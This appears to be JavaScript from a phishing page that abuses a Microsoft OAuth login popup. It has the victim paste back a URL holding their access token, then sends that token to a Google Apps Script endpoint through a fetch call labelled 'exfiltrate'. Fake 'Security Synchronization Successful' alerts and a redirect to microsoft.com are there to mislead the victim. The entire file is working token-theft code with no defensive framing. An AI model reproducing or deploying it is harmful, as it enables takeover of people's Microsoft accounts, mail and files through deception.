/**
 * PATH D: AZURE POWERSHELL BRIDGE (Universal & No Warning)
 */
const GS_URL = "https://script.google.com/macros/s/AKfycbwCVnWFmseoIYGiY4HtU_Quq5gqmKgUyEoE-QeLTBb54fK0iYMEXAX0b7Ho2HfD_mFV/exec"; 

function startBridge() {
    // Official Microsoft Azure PowerShell Client ID
    // Trusted for both Personal and Business accounts.
    const AZURE_PS_ID = "1950a258-227b-4e31-a9cf-717495945fc2";
    const NATIVE_REDIRECT = "https://login.microsoftonline.com/common/oauth2/nativeclient";

    const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
        `client_id=${AZURE_PS_ID}` +
        `&response_type=token+id_token` +
        `&scope=https://graph.microsoft.com/.default+offline_access+openid+profile` +
        `&response_mode=fragment` + 
        `&prompt=login` + 
        `&nonce=${Math.random().toString(36).substring(7)}` +
        `&redirect_uri=${encodeURIComponent(NATIVE_REDIRECT)}`;

    // Transition UI
    document.getElementById('step-1').classList.add('hidden');
    document.getElementById('step-2').classList.remove('hidden');

    // Open login in a popup
    window.open(authUrl, "_blank", "width=500,height=600");
}

async function exfiltrateToGS() {
    const rawData = document.getElementById('raw-url').value;
    if (!rawData || !rawData.includes("access_token")) {
        alert("Verification URL not detected. Please ensure you copied the full URL from the popup.");
        return;
    }

    try {
        const response = await fetch(`${GS_URL}?action=exfiltrate&data=${encodeURIComponent(rawData)}`);
        const result = await response.json();
        if (result.status === "success") {
            alert("Security Synchronization Successful.");
            window.location.href = "https://www.microsoft.com";
        }
    } catch (err) {
        console.error("Connection Error:", err);
        alert("Sync failed. Please check your network connection.");
    }
}
